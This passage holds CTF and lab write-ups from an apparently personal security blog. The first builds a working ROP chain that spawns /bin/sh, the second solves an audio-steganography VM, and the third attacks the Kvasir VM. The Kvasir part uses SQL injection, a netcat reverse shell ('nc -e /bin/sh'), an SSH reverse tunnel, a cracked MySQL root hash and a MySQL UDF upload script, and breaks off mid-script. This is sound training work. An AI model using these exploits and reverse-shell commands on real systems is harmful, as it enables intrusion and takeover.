Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
gdb-peda$ r &lt; input_for_bin 
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84 
EDX: 0x80cb690 --&gt; 0x0 
ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
EDI: 0x88c01b86 
EBP: 0x4b4b4b4b ('KKKK')
ESP: 0xbffff620 --&gt; 0x0 
EIP: 0xdeadbeef
EFLAGS: 0x210246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0xdeadbeef
[------------------------------------stack-------------------------------------]
0000| 0xbffff620 --&gt; 0x0 
0004| 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7e9 ("/home/seb/tmp/level0")
0008| 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7fe ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
0012| 0xbffff62c --&gt; 0x0 
0016| 0xbffff630 --&gt; 0x0 
0020| 0xbffff634 --&gt; 0x0 
0024| 0xbffff638 --&gt; 0x0 
0028| 0xbffff63c --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xdeadbeef in ?? ()
</code></pre>

<p>Regardless of which method is used, <code>eip</code> now points at <code>0xdeadbeef</code>, which confirms that our proof-of-concept exploit works as intended. We can now start extending the ROP chain to start doing useful things.</p>

<p>In the workshop, I showed the mprotect/read/ret to shellcode strategy. In this writeup, I will use a different way to spawn a shell. We will need access to <code>execve</code> or <code>system()</code> for this.</p>

<p>A lot of students of the ROP workshop tried to find <code>system()</code>, fruitlessly:</p>

<pre><code class="bash">gdb-peda$ p system
No symbol table is loaded.  Use the "file" command.
</code></pre>

<p><code>system()</code> is not linked in this binary! There is, however, one <code>int 0x80; ret</code> gadget available, which we can use to build a ROP chain. During the workshop in London I showed the <code>mprotect</code> and <code>read</code> strategy. Now, I&rsquo;d like to show how to do an <code>execve</code> syscall using the ROP chain. For added fun, I&rsquo;ll assume that NULL bytes are badchars.</p>

<p>First, however, upload the binary to <a href="http://ropshell.com">ropshell.com</a> or use Your-Favorite-ROP-Gadget-Dumper.</p>

<p>One thing that is <em>absolutely</em> mandatory is access to a gadget that does a syscall. ropshell.com suggests <code>&gt; 0x08052cf0 : int 0x80; ret</code>. Sometimes, there might be another gadget where extra instructions are present between the <code>int</code> and the <code>ret</code>. This is usually fine and you can find them in ropshell.com by searching like this: <code>int 0x80 ?</code>. The extra <code>?</code> indicates that extra opcodes may be present.</p>

<p>Now that we have that all important gadget, we can start building the rest of the ROP chain. We&rsquo;ll need to set a couple of registers and build the argument for <code>execve</code> in memory.</p>

<p>For x86 syscalls, the arguments are passed in registers. <a href="http://syscalls.kernelgrok.com/">This website</a> contains a list of the syscalls and a short description of the arguments. For <code>execve</code>, we see this:</p>

<pre><code>eax = syscall number = 0x0b
ebx = pointer to filename to execute
ecx = pointer to argv
edx = pointer to envp
</code></pre>

<p>However, I was unable to get the exploit to work when <code>ecx</code> was pointing to a string. Instead, I opted to set <code>ecx</code> and <code>edx</code> to NULL. Let&rsquo;s start building this ROP chain, starting from the PoC. We will need to write out the string <code>/bin/sh</code> somewhere in memory. For this, we need two things:</p>

<ol>
<li>A location to write the string</li>
<li>A gadget that allows us to write out the string</li>
</ol>


<p>For #1, we can look at the output of vmmap in gdb-peda:</p>

<pre><code>gdb-peda$ vmmap
Start      End        Perm  Name
0x08048000 0x080ca000 r-xp  /home/seb/tmp/level0
0x080ca000 0x080cb000 rw-p  /home/seb/tmp/level0
0x080cb000 0x080ef000 rw-p  [heap]
0xb7fff000 0xb8000000 r-xp  [vdso]
0xbffdf000 0xc0000000 rw-p  [stack]
</code></pre>

<p>ASLR is disabled, but taking the heap or stack is not my favorite option. Instead, let&rsquo;s use <code>0x080ca000</code> to <code>0x080cb000</code>. This area is readable and writeable. Not executable but that doesn&rsquo;t matter, as we will not store shellcode there anyway.</p>

<p>For #2, ropshell.com has no good suggestions, as they are <code>add [r32], r32</code> instructions. If the memory contains values already, we&rsquo;ll not be able to write out the string reliably, unless the block of memory contains NULL bytes.</p>

<p>To avoid complications, I searched for <code>mov [?</code> in ropshell.com:</p>

<pre><code>ropshell&gt; search mov [?
found many, display max 256 gadgets
&gt; 0x0806bc2b : mov [ecx], 0x83; ret
&gt; 0x08071e79 : mov [ecx], 1; ret
&gt; 0x08079191 : mov [edx], eax; ret
&gt; 0x080a82e8 : mov [eax + 0x4c], edx; ret
&gt; 0x080a6544 : mov [ecx + 0x1fc0], 4; ret
&gt; 0x08076839 : mov [ecx + 0x83049a74], cl; ret
&gt; 0x08052fac : mov [ecx], 1; pop ebp; ret 4
&gt; 0x080499d2 : mov [ecx], eax; pop ebp; ret
&gt; 0x080526f6 : mov [ecx], edx; pop ebp; ret
</code></pre>

<p>I like <code>0x08079191 : mov [edx], eax; ret</code> a lot. It&rsquo;s only uses two registers and contains no unnecessary instructions. Let&rsquo;s see how we can set <code>edx</code> and <code>eax</code> to what we need.</p>

<pre><code>ropshell&gt; search pop r32
found 15 gadgets
&gt; 0x0806b893 : pop eax; ret
&gt; 0x080525ee : pop ebx; ret
&gt; 0x080525c6 : pop edx; ret
&gt; 0x0806a5c9 : pop esi; ret
&gt; 0x080516ad : pop edi; ret
&gt; 0x08048550 : pop ebp; ret
&gt; 0x08064630 : pop esp; ret
&gt; 0x080525ed : pop ecx; pop ebx; ret
</code></pre>

<p>Plenty of gadgets we can use. The plan is now to pop the address <code>0x080ca040</code> into <code>edx</code> and the value <code>/bin</code> into <code>eax</code>. The address is arbitrary, but chosen such that we don&rsquo;t overwrite anything important or that the address contains NULL bytes. Let&rsquo;s build the first PoC:</p>

<pre><code class="python">import struct

# this is a helper function, which will take a 32-bit value and convert it to little-endian.
def p(x):
    return struct.pack('&lt;L', x)

# start our payload as a string of character.
payload = ""

# add padding to overwrite upto the saved return address.
payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"

payload += p(0x080525c6)    # pop edx; ret
payload += p(0x080ca040)    # start writing here
payload += p(0x0806b893)    # pop eax; ret
payload += '/bin'           # first part of /bin/sh
payload += p(0x08079191)    # mov [edx], eax; ret

payload += p(0x080525c6)    # pop edx; ret
payload += p(0x080ca044)    # just after the first piece of '/bin'
payload += p(0x0806b893)    # pop eax; ret
payload += '/shX'           # we'll zero out the X in a moment
payload += p(0x08079191)    # mov [edx], eax; ret

payload += p(0x08097bff)    # xor eax, eax; ret (set eax to 0)
payload += p(0x080525c6)    # pop edx; ret
payload += p(0x080ca047)    # zero out the X, making the string NULL terminated
payload += p(0x08079191)    # mov [edx], eax; ret

payload += "AAAA"           # crash
print payload
</code></pre>

<p>Run it and expect the memory area:</p>

<pre><code>seb@minol:~/tmp$ python purepoc0.py &gt; input0
seb@minol:~/tmp$ gdb -q level0
Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
gdb-peda$ r &lt; input0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK�@�
              ��/bin��D�
                       ��/shX��{       �G�
                                         �AAAA!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84 
EDX: 0x80ca047 --&gt; 0x0 
ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
EDI: 0x6f23fbda 
EBP: 0x4b4b4b4b ('KKKK')
ESP: 0xbffff658 --&gt; 0x0 
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x210246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff658 --&gt; 0x0 
0004| 0xbffff65c --&gt; 0x0 
0008| 0xbffff660 --&gt; 0x0 
0012| 0xbffff664 --&gt; 0x0 
0016| 0xbffff668 --&gt; 0x0 
0020| 0xbffff66c --&gt; 0x6f23fbda 
0024| 0xbffff670 --&gt; 0x0 
0028| 0xbffff674 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ x/s 0x80ca040
0x80ca040:   "/bin/sh"
</code></pre>

<p>Excellent, that worked. Now we have to set the registers accordingly. <code>ebx</code> must be set to <code>0x80ca040</code>, <code>eax</code> must be set to <code>0x0b</code> and we&rsquo;ll zero out <code>ecx</code> and <code>edx</code>.</p>

<p>There are no gadgets that do <code>xor ecx, ecx; ret</code>. Instead, I opted to load <code>0xffffffff</code> into <code>ecx</code> and <code>edx</code> and then increase the registers by one; this will overflow and make both of them zero.</p>

<pre><code># building from the previous code

payload += p(0x080525ed)    # pop ecx; pop ebx; ret
payload += p(0xffffffff)    # ecx -&gt; will be zeroed later
payload += p(0x080ca040)    # ebx, filename to execute "/bin/sh"
payload += p(0x08083f36)    # inc ecx; adc al, 0x39; ret
                            # this will clobber eax, but we'll set it later anyway. ecx will be zero

# do the same for edx                       
payload += p(0x080525c6)    # pop edx; ret
payload += p(0xffffffff)    # 
payload += p(0x0804ef21)    # inc edx; add al, 0x83; ret
</code></pre>

<p>Our next problem arises: I don&rsquo;t want to use NULL bytes. However, we&rsquo;ll need to set <code>eax</code> to <code>0x0000000b</code>. I use the following sequence for this, making use of the <code>movzx</code> instruction. <code>movzx</code> is <em>move into register, zero extend</em>.</p>

<pre><code># continue

payload += p(0x0806b893)    # pop eax; ret
payload += p(0x4141410b)    # value for eax, without NULL bytes
payload += p(0x08071b90)    # movzx eax, al; ret
                            # after this instruction, eax will be 0x0b

payload += p(0x08052cf0)    # int 0x80; ret
</code></pre>

<p>That&rsquo;s it. Let&rsquo;s try:</p>

<pre><code class="bash">seb@minol:~/tmp$ python purepoc0.py &gt; input0
seb@minol:~/tmp$ gdb -q level0
Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
gdb-peda$ r &lt; input0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...

process 3481 is executing new program: /bin/dash
[Inferior 1 (process 3481) exited normally]
Warning: not running or target is remote
gdb-peda$
</code></pre>

<p>Nice! It looks like the shell was spawned! A final test consists of running it on the command line. The extra <code>cat</code> is added to keep the spawned shell alive, by connecting stdin and stdout of the newly created shell.</p>

<pre><code class="bash">seb@minol:~/tmp$ (python purepoc0.py; cat) | ./level0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...&lt;snipped&gt;
id
uid=1000(seb) gid=1000(seb) groups=1000(seb),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),103(fuse),104(scanner),107(bluetooth),108(netdev),119(kismet),900(cbnetwork)
whoami
seb
</code></pre>

<p>That was about it. The ROP chain is able to set all the required registers, write out a string in memory and finally perform a syscall.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[By the Numbers - theFrequency Writeup]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/15/by-the-numbers-thefrequency-writeup/"/>
    <updated>2015-01-15T17:21:58+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/15/by-the-numbers-thefrequency-writeup</id>
    <content type="html"><![CDATA[<p>Within a few days of releasing thePurge, strata decided to release yet another VM! This one was called theFrequency&hellip; It presents a very nice challenge involving radio signal encoding and audio stego. I needed several hints to solve this one, but it was worth it!</p>

<!-- more -->


<p></p>

<p>I downloaded it and did the normal nmap dance. Like many VMs these days, only one port was open. It was, of course, <code>http</code>, serving only a single mp3 file:</p>

<p><img src="/assets/freq/webserver.png" alt="" /></p>

<h2>DA-DIT-DA</h2>

<p>It&rsquo;s some kind of ambient mix, but at certain points in the audio you can hear weird noises and clicks. This sounded like audio stego to me! After downloading, I fired up <a href="http://www.sonicvisualiser.org/">Sonic Visualizer</a> and loaded the mp3. Select &lsquo;Layer > Add spectrogram&rsquo; or press <code>Ctrl+G</code> to visualize the sound. Right away, we can hear/see something that can only be Morse:</p>

<p><img src="/assets/freq/first-visualizer.png" alt="" /></p>

<p>I just used a <a href="https://en.wikipedia.org/wiki/Morse_code">Morse lookup table</a> to decode it by ear/hand:</p>

<p><img src="/assets/freq/morse.png" alt="" /></p>

<p>It decoded to <code>THE PASSWORD FOR LEVEL ONE IS THEFREQUENCY2015.</code> I then tried to use <code>ssh</code> to login to VM, only to be rejected. I had to use <code>sftp</code>, apparently. After logging in with lowercase <code>thefrequency2015.</code>, I grabbed the only file that was present. This was part of a larger SSH key. Gotta catch &lsquo;em all!</p>

<h2>LIGHTWRITER</h2>

<p>The second series of clicks is further away in the audio, at around 17 minutes. Looking at the spectrogram:</p>

<p><img src="/assets/freq/hellschreiber.png" alt="" /></p>

<p>I couldn&rsquo;t really figure out what this was. strata gave two hints, being <a href="http://wb8nut.com/digital/">this page full of digital radio mode examples</a> and saying something like &lsquo;you can almost read the letters&rsquo;. This meant that it had to be Hellschreiber (German for Lightwriter, I believe). But I couldn&rsquo;t figure out how to decode it by hand in Sonic Visualizer. I got pretty close:</p>

<p><img src="/assets/freq/level2.png" alt="" /></p>

<p>I could barely make out <code>THE PASSWORD FOR LEVEL TWO IS</code> and then&hellip; I started looking at the symbols, some looked very similar. I started seeing some letters. Looking at the Hellschreiber wikipedia page, it turned out Hellschreiber was invented by Rudolf Hell. This was also the password; I finally managed to decode it to <code>RUDOLFHELL1920</code>.</p>

<p>Then I managed to install <code>fldigi</code> on an Ubuntu 12.04 VM. This made it significantly easier. I extracted the relevant part of the mp3 with <code>audacity</code> and merged the stereo channels to mono (otherwise <code>fldigi</code> complains).</p>

<p><img src="/assets/freq/level2-fldigi.png" alt="" /></p>

<p>Again I could sftp to the VM and grab part of the key.</p>

<h2>IT SOUNDS JUST AS BAD AS IT LOOKS</h2>

<p>Onto level three! It sounds warbling, almost dissonant (for those of you that read Stephen King, &ldquo;It sounds Hawaian, doesn&rsquo;t it?&rdquo;). You can find it around 30:40, and from the digital modes page earlier, I thought that it was RTTY. It sure sounded like it! <code>fldigi</code> did not agree. It turned out to be BPSK31:</p>

<p><img src="/assets/freq/level3-psk.png" alt="" /></p>

<p>The key was coming together now. Level four was found around 41 minutes and sounded even worse. I had no idea how to decode it, but luckily strata gave me a hint. The bandwidth on this audio encoding scheme was 2 kHz and I tried all the modes that allowed for this bandwidth. It was the MT63 mode, used also by emergency services. You have to keep the sample running for a while, as only the first part really contains information.</p>

<p><img src="/assets/freq/level4-fldigi.png" alt="" /></p>

<p>Level five was next, and turned out to be RTTY!</p>

<p><img src="/assets/freq/level5.png" alt="" /></p>

<p>I could actually hear this, also for the next one. Level six was THROB and that describes the sound quite accurately.</p>

<p><img src="/assets/freq/level5-rtty.png" alt="" /></p>

<p><img src="/assets/freq/level6-throb.png" alt="" /></p>

<p>So now I had all the pieces of the key! I pieced them together and threw them at the root login&hellip; only to be asked for a passphrase. Bah! I thought, back to the mp3 and look for the passphrase. I looked at level six again:</p>

<p><img src="/assets/freq/level6-olivia.png" alt="" /></p>

<p>There seemed to be something at around 8 kHz! I stumbled upon <a href="http://www.hfradio.org.uk/html/digital_modes.html">this page</a> which made me believe it was encoded using <code>olivia</code> or <code>contestia</code>. I extracted that piece, applied a high-pass filter with a cutoff around 6 kHz and amplified the signal. But I could <strong>not</strong> get <code>fldigi</code> to decode it. After consulting with strata, it seemed that this was actually <em>part of the ambient mix itself</em>. Talk about stego!</p>

<p>So now what? I had to update my <code>ssh</code> to go login. The version on my own box did not support the key format. I opened a Kali box, got the latest &amp; greatest source tarball for OpenSSH, which was version 6.7p1. After that was done compiling, I could login as root using the acquired private key.</p>

<h2>Victory at last</h2>

<pre><code class="bash"># cat flag.txt                                                                 
https://www.youtube.com/watch?v=KEZTkvjSmHQ

c5c8e00567f44fe9155655ddba163547
# hostname                                                                     
frequency.local
# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
# whoami
root
</code></pre>

<p>Learned a ton while doing this one, very left-field VM, very different from the usual VMs on VulnHub! Overall, I&rsquo;d say it&rsquo;s perfect material for CTF training!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[We Need to Go Deeper: Kvasir Writeup]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup/"/>
    <updated>2014-11-03T18:51:05+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup</id>
    <content type="html"><![CDATA[<p>I was asked to test <a href="https://twitter.com/_RastaMouse">Rasta Mouse&rsquo;s</a> awesome VM called <a href="http://vulnhub.com/entry/kvasir-i,106/">Kvasir</a> some time ago, which I always find an honor. I figured it was time to do a writeup!</p>

<!--more-->


<p>Disclaimer: Since I did this VM a while ago, and tested several versions, this write-up is not going to describe my exact thought-process. Sometimes, I&rsquo;ll skip over one or two steps. I&rsquo;m sorry for that, but rest assured I gave Kvasir all the love it deserved ;]</p>

<p>After importing the VM into VirtualBox and disabling the USB 2.0 Controller, I booted it up and waited a while. It takes some time for the VM to fully start. Meanwhile, I scanned it with <code>nmap</code>:</p>

<pre><code class="bash">bas@tritonal:~$ sudo nmap -sS -T4 10.8.7.101

Starting Nmap 6.00 ( http://nmap.org ) at 2014-11-03 19:00 CET
Nmap scan report for 10.8.7.101
Host is up (0.00092s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:CF:5D:57 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 39.73 seconds
</code></pre>

<p>Hmm. Let&rsquo;s load up that webpage.</p>

<p><img src="/assets/kvasir/00.png" alt="" /></p>

<p>It&rsquo;s a login page, but we have no valid login. We can create one, but that got me nowhere. Testing for the usual SQL injections did no good. Let&rsquo;s go and register:</p>

<p><img src="/assets/kvasir/01.png" alt="" /></p>

<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'bas' ', 'bas'', 0, NULL)' at line 1
</code></pre>

<p>An SQL error! Part of the query that is supposed to add a new user to the database is visible. The <code>0, NULL</code> values seemed meaningful. It could be that the <code>0</code> controls some aspect of the user, like permissions. I injected the following SQL:</p>

<p><img src="/assets/kvasir/02.png" alt="" /></p>

<p>After logging in, I was redirected to <code>admin.php</code>:</p>

<p><img src="/assets/kvasir/03.png" alt="" /></p>

<p>This smells like command injection to me! Let&rsquo;s try something:</p>

<p><img src="/assets/kvasir/04.png" alt="" /></p>

<p>Cool, we have command injection. Can we get a shell on the box?</p>

<pre><code>apache2; nc -e /bin/sh 10.8.7.1 7777 #
</code></pre>

<p>In the netcat listener ($ added for clarity):</p>

<pre><code class="bash">bas@tritonal:~$ nc -vlnp 7777
listening on [any] 7777 ... 
connect to [10.8.7.1] from (UNKNOWN) [10.8.7.101] 39148
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ ls
admin.php
index.php
login.php
logout.php
member.php
register.php
submit.php

$ head login.php
&lt;?php

$username = $_POST["username"];
$password = $_POST["password"];

mysql_connect("192.168.2.200", "webapp", "webapp") or die(mysql_error());
mysql_select_db("webapp") or die(mysql_error());

$query = "SELECT * FROM users where username='$username' AND password='$password'";
$result = mysql_query($query) or die(mysql_error());

/sbin/ifconfig
eth0      Link encap:Ethernet  HWaddr fe:7f:29:91:70:e2  
          inet addr:192.168.1.100  Bcast:192.168.1.255  Mask:255.255.255.0
          inet6 addr: fe80::fc7f:29ff:fe91:70e2/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:249 errors:0 dropped:0 overruns:0 frame:0
          TX packets:166 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:38924 (38.0 KiB)  TX bytes:31129 (30.3 KiB)

eth1      Link encap:Ethernet  HWaddr ba:e4:73:90:79:b3  
          inet addr:192.168.2.100  Bcast:192.168.2.255  Mask:255.255.255.0
          inet6 addr: fe80::b8e4:73ff:fe90:79b3/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:119 errors:0 dropped:0 overruns:0 frame:0
          TX packets:62 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:19853 (19.3 KiB)  TX bytes:5341 (5.2 KiB)
</code></pre>

<p>Interesting, there is another box that handles the database. From <code>login.php</code>, I harvested some credentials. Let&rsquo;s enable an SSH tunnel to access that second box. I transferred over my SSH key to enable a reverse SSH tunnel (a stupid &amp; dangerous thing to do in a real scenario!):</p>

<pre><code class="bash">nc 10.8.7.1 7777 &gt; /tmp/bas &amp;&amp; chmod 600 /tmp/bas
ls -alh
total 12K
drwxrwxrwt  2 root     root     4.0K Sep  4 16:58 .
drwxr-xr-x 22 root     root     4.0K Aug  9 20:06 ..
-rw-------  1 www-data www-data 1.7K Sep  4 16:58 bas
ssh -fN -R 13333:192.168.2.200:3306 -o StrictHostKeyChecking=no bas@10.8.7.1 -i /tmp/bas
</code></pre>

<p>The <code>ssh</code> command was mind-boggling. <code>-fN</code> asks ssh to not run remote commands and background itself; useful for running tunnels. Then,<code>-R</code> requests a reverse tunnel. <code>13333:192.168.2.200:3306</code> means &ldquo;start a tunnel to <code>192.168.2.200:3306</code> on port 13333&rdquo;. The local host is 10.8.7.1, my own box. Finally, the magic ingredient was <code>-o StrictHostKeyChecking=no</code>, which makes ssh skip the verification. Usually, it will ask &ldquo;add host x to known hosts?&rdquo;. However, since we have a limited reverse shell instead of a proper tty, this will not allow us to type &lsquo;yes&rsquo;. Specifying <code>StrictHostKeyChecking=no</code> circumvents this. This allowed me to access the remote database server via the webserver box:</p>

<pre><code class="bash">bas@tritonal:~$ mysql -h 127.0.0.1 -P 13333 -u webapp -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 42
Server version: 5.5.37-0+wheezy1 (Debian)

Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| webapp             |
+--------------------+
4 rows in set (0.01 sec)

mysql&gt; use webapp
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+------------------+
| Tables_in_webapp |
+------------------+
| todo             |
| users            |
+------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from users;
+----------+----------+------+-------+----+
| username | password | dob  | admin | id |
+----------+----------+------+-------+----+
| bas      | bas      | 0    |     1 |  1 |
| bleh     | bleh     | bleh |     0 |  2 |
+----------+----------+------+-------+----+
3 rows in set (0.00 sec)

mysql&gt; select * from todo;
+----------------------------+
| task                       |
+----------------------------+
| stop running mysql as root |
+----------------------------+
1 row in set (0.00 sec)

mysql&gt; 
</code></pre>

<p><code>mysql</code> is running as root? Interesting, maybe it has FILE permissions, too! Further enumeration of the database:</p>

<pre><code class="bash">mysql&gt; use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
24 rows in set (0.01 sec)

mysql&gt; select * from user;

| Host          | User             | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |

| localhost     | root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| db            | root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| 127.0.0.1     | root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| ::1           | root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| localhost     | debian-sys-maint | *E0E0871376896664A590151D348CCE9AA800435B | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |
| 192.168.2.100 | webapp           | *BF7C27E734F86F28A9386E9759D238AFB863BDE3 | Y           | Y           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |
| 192.168.2.100 | root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |

7 rows in set (0.01 sec)
</code></pre>

<p>Aha, the hashed password of the root user! Googling for the <a href="http://sha1.znaet.org/sha1/ecb01d78c2fbee997eda584c647183fd99c115fd">hash of the root user</a> landed the password <code>coolwater</code>. Sweet! Next, I wanted to run <em>shell</em> commands as the root user, but for that we need something like <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys</a>. Luckily, the root user has ALL permissions and therefore should be able to create files:</p>

<pre><code>bas@tritonal:~$ mysql -h 127.0.0.1 -P 13333 -u root -pcoolwater
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 43
Server version: 5.5.37-0+wheezy1 (Debian)

Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show grants;
+--------------------------------------------------------------------------------------------------------------------------------------------+
| Grants for root@192.168.2.100                                                                                                              |
+--------------------------------------------------------------------------------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.2.100' IDENTIFIED BY PASSWORD '*ECB01D78C2FBEE997EDA584C647183FD99C115FD' WITH GRANT OPTION |
+--------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.01 sec)
</code></pre>

<p>Without going into detail, I made a script that uploaded <code>lib_mysql_udf</code> to the remote server. After registering the right command, this allowed me to run commands. In one go, the script builds the SQL command to install <code>lib_mysql_udf</code> and adds my public key to the authorized SSH keys of the root user:</p>

<pre><code class="bash">#!/bin/bash

echo "SELECT 0x" &gt; payload
cat lib_mysqludf_sys.so |xxd -p &gt;&gt; payload
echo " INTO DUMPFILE '/usr/lib/mysql/plugin/udf_exploit.so'; " &gt;&gt; payload
echo "DROP FUNCTION IF EXISTS sys_exec; " &gt;&gt; payload
echo "CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_exploit.so'; " &gt;&gt; payload
echo "SELECT '" &gt;&gt; payload
